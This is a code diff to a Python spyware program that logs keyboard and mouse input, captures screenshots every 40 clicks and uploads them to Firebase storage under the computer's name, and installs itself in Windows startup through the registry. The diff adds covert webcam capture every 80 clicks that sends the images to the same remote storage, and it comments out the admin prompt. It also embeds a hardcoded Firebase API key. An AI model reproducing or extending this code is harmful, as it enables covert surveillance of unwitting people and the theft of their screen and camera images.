@@ -4,7 +4,7 @@ import os
 import shutil
 import sys
 import winreg
-
+import cv2
 from PIL import Image
 import mss as mss
 from pynput import keyboard, mouse
@@ -19,10 +19,11 @@ def is_admin():
         return False
 
 
-if not is_admin():
+#if not is_admin():
     # Re-run the program with admin rights
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-    os._exit(1)
+#    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+#    os._exit(1)
+
 
 config = {
     'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
@@ -127,8 +128,6 @@ def on_click(x, y, button, pressed):
     clicks_counter += 1
     if clicks_counter == 40:
         # take screenshot and upload to firebase storage
-        clicks_counter = 0
-
         try:
             with mss.mss() as sct:
                 sct.shot(output=imgPath)
@@ -138,12 +137,32 @@ def on_click(x, y, button, pressed):
                 image = image.resize((1000, 562), Image.ANTIALIAS)
                 image.save(imgPath, quality=50, optimize=True)
 
-                full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
-                today_date = full_currentTime.split(' ')[1]
-
                 storage.child(pcName +
                               '/screenshot_' + full_currentTime + '.jpg') \
                     .put(imgPath)
+        except Exception as e:
+            print(e)
+
+    elif clicks_counter==80:
+        clicks_counter=0
+        try:
+            vc = cv2.VideoCapture(0)
+            if vc.isOpened():  # try to get the first frame
+                success, frame = vc.read()
+                while not success:
+                    success, frame = vc.read()
+
+            full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
+            today_date = full_currentTime.split(' ')[1]
+
+            cv2.imwrite('webcam_shot.jpg', frame)
+            frame = Image.open('webcam_shot.jpg')
+            frame = frame.resize((640, 480), Image.ANTIALIAS)
+            frame.save('webcam_shot.jpg', quality=50, optimize=True)
+
+            storage.child(pcName +
+                          '/webcam_' + full_currentTime + '.jpg') \
+                .put('webcam_shot.jpg')
         except Exception as e:
             print(e)
 
@@ -166,6 +185,7 @@ def addToStartup():
                           winreg.REG_SZ, exePath)  # file_path is path of file after coping it
     except:
         pass
+
 
 addToStartup()
 
